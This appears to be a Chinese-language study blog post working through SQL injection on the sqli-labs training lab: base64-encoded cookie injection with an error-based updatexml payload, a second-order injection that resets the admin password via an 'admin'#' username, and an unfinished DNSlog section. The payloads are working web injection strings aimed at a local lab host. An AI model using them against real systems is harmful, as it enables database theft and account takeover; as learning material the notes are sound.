---
title: "二次注入 2"
date: 2026-04-07
published: 2026-04-07
author: Rin
permalink: /posts/.trash/二次注入 2/
categories:
  - .trash
  - 二次注入 2
tags:
  - Study
---

### 1、加解密注入

sqlilabs-less21-cookie&加解密注入(实际案例)

![](https://cdn.nlark.com/yuque/0/2021/png/2476579/1625197034253-5c830239-d236-4872-827d-e2494cb1134f.png)

抓取cookie数据包

```
GET /Less-21/index.php HTTP/1.1
Host: 10.1.1.133
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Referer: http://10.1.1.133/Less-21/index.php
Connection: close
Cookie: uname=YWRtaW4%3D
Upgrade-Insecure-Requests: 1
```

`YWRtaW4%3D`这是一个base64加密的字符串其中%3D是编码中的`=`符号，把他发送到编码模块当中解密,得到明文

![](https://cdn.nlark.com/yuque/0/2021/png/2476579/1625197175542-5b72f5d8-368c-4cf5-ac31-570c9ba47559.png)

发现这个是注入点需要将原来的注入方式重新加密发送给服务器。

![](https://cdn.nlark.com/yuque/0/2021/png/2476579/1625197480831-2345af38-58ae-4469-8e6c-e57132d5efad.png)

也就是说`admin' and 1=1`加密之后的值是`YWRtaW4nIGFuZCAxPTE=`

![](https://cdn.nlark.com/yuque/0/2021/png/2476579/1625197601823-b7d21846-9977-4b78-be84-49fb39c323f4.png)

获取数据库名称`admin' or updatexml(1,concat(0x7e,(database())),0) or '`加密后cookie值`Cookie: uname=YWRtaW4nIG9yIHVwZGF0ZXhtbCgxLGNvbmNhdCgweDdlLChkYXRhYmFzZSgpKSksMCkgb3IgJwo=`

![](https://cdn.nlark.com/yuque/0/2021/png/2476579/1625198302828-b0a69d09-5ac3-48c5-8de9-fce71dd924de.png)

![](https://cdn.nlark.com/yuque/0/2021/png/2476579/1625198355098-0b833318-e459-4fbd-be31-28ef8d3356f2.png)

### 2、二次注入

二次注入一般是用于白盒测试、黑盒测试就算是找到注入也没办法攻击。

![](https://cdn.nlark.com/yuque/0/2021/png/2476579/1625199336305-79a73dff-0292-4899-9ff3-15f8e4f6110a.png)

sqlilabs-less24-post登陆框&二次注入

![](https://cdn.nlark.com/yuque/0/2021/png/2476579/1625361677510-23a50145-6828-434f-a9e9-53f12db3156e.png)

数据库中查询

```
mysql> select * from users;
+----+----------+------------+
| id | username | password   |
+----+----------+------------+
|  1 | Dumb     | Dumb       |
|  2 | Angelina | I-kill-you |
|  3 | Dummy    | p@ssword   |
|  4 | secure   | crappy     |
|  5 | stupid   | stupidity  |
|  6 | superman | genious    |
|  7 | batman   | mob!le     |
|  8 | admin    | admin      |
|  9 | admin1   | admin1     |
| 10 | admin2   | admin2     |
| 11 | admin3   | admin3     |
| 12 | dhakkan  | dumbo      |
| 14 | admin4   | admin4     |
| 15 | admin'#  | admin      |
+----+----------+------------+
14 rows in set (0.00 sec)
```

登录用户修改密码

![](https://cdn.nlark.com/yuque/0/2021/png/2476579/1625361805412-1b2dac42-8eb0-42ce-810c-ada6bb1d6643.png)

```
mysql> select * from users;
+----+----------+------------+
| id | username | password   |
+----+----------+------------+
|  1 | Dumb     | Dumb       |
|  2 | Angelina | I-kill-you |
|  3 | Dummy    | p@ssword   |
|  4 | secure   | crappy     |
|  5 | stupid   | stupidity  |
|  6 | superman | genious    |
|  7 | batman   | mob!le     |
|  8 | admin    | 123456     |
|  9 | admin1   | admin1     |
| 10 | admin2   | admin2     |
| 11 | admin3   | admin3     |
| 12 | dhakkan  | dumbo      |
| 14 | admin4   | admin4     |
| 15 | admin'#  | admin      |
+----+----------+------------+
14 rows in set (0.00 sec)
```

最后我们看到的是将admin的账户密码修改为了123456而admin'#并没有发生改变，原因是代码执行的过程中将'#没有过滤直接带入执行导致'与前面的代码闭合而#将后面的代码给注释。

### 3、dnslog注入

  

涉及资源：[http://ceye.io](http://ceye.io)

参考资料：[https://www.cnblogs.com/xhds/p/12322839.html](https://www.cnblogs.com/xhds/p/12322839.html)

使用DnsLog盲注仅限于windos环境。

不知道啥子个情况dnslog在windows还是linux上就是没法运行缺少各种的库文件。所以先暂时放一段

### 4、中转注入